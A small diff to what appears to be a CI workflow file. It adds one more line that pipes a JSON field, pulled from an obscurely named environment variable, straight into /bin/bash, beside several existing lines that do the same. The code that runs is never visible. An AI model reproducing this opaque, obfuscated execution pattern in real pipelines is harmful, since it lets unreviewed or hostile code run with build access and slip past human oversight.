@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$hkyn292" | jq -r .rnpc2 | /bin/bash
           echo $rmrjb004 | jq -r .n9 | /bin/bash
           echo $ua06822 | jq -r .ap4600 | /bin/bash
+          echo $efq5134 | jq -r .ysch4 | /bin/bash
 
       - name: Save archive
         if: always()
